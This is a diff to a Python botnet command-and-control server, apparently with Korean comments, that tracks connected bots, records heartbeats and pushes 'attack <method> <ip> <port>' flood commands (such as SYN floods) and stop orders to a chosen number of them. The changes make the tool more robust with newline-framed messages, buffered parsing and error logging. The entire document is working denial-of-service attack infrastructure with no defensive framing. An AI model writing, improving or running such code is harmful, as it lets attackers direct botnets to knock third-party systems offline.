@@ -1,4 +1,6 @@
-import socket, threading, time
+import socket
+import threading
+import time
 from datetime import datetime
 import sys
 
@@ -6,16 +8,31 @@ bots = {}
 
 def client_handler(conn, addr):
     ip = addr[0]
-    bots[ip] = {"sock": conn, "connected_at": datetime.now(), "last_heartbeat": datetime.now()}
+    bots[ip] = {
+        "sock": conn,
+        "connected_at": datetime.now(),
+        "last_heartbeat": datetime.now()
+    }
     try:
+        buffer = ""
         while True:
-            data = conn.recv(1024).decode()
-            if data == "heartbeat":
-                bots[ip]["last_heartbeat"] = datetime.now()
-            elif data.startswith("done"):
-                print(f"[DONE] {ip} -> {data}")
-    except:
-        pass
+            chunk = conn.recv(1024).decode()
+            if not chunk:
+                break
+            buffer += chunk
+            while "\n" in buffer:
+                line, buffer = buffer.split("\n", 1)
+                line = line.strip()
+                if not line:
+                    continue
+                print(f"[RECV] {ip} -> {repr(line)}")
+                if line == "heartbeat":
+                    bots[ip]["last_heartbeat"] = datetime.now()
+                elif line.startswith("done"):
+                    print(f"[DONE] {ip} -> {line}")
+                # hello 및 기타 메시지도 여기서 로그로 남김
+    except Exception as e:
+        print(f"Error from {ip}: {e}")
     finally:
         bots.pop(ip, None)
         conn.close()
@@ -31,17 +48,19 @@ def start_server():
 
 def send_attack(method, ip, port, bot_count):
     for bot in list(bots.values())[:bot_count]:
-        cmd = f"attack {method} {ip} {port}"
+        cmd = f"attack {method} {ip} {port}\n"
         try:
             bot["sock"].send(cmd.encode())
-        except:
+        except Exception as e:
+            print(f"Error sending attack: {e}")
             continue
 
 def send_stop(bot_count):
     for bot in list(bots.values())[:bot_count]:
         try:
-            bot["sock"].send(b"stop")
-        except:
+            bot["sock"].send(b"stop\n")
+        except Exception as e:
+            print(f"Error sending stop: {e}")
             continue
 
 if __name__ == "__main__":
@@ -57,15 +76,7 @@ if __name__ == "__main__":
             elif cmd.startswith("attack"):
                 parts = cmd.strip().split()
                 # attack syn <ip> <port> <bot_count>
-                # attack <method> <ip> <port> <bot_count>
-                if len(parts) == 5 and parts[1] == "syn":
-                    _, method, ip, port, count = parts
-                    try:
-                        send_attack(method, ip, int(port), int(count))
-                    except Exception as e:
-                        print(f"명령 처리 중 오류: {e}")
-                        continue
-                elif len(parts) == 5:
+                if len(parts) == 5:
                     _, method, ip, port, count = parts
                     try:
                         send_attack(method, ip, int(port), int(count))
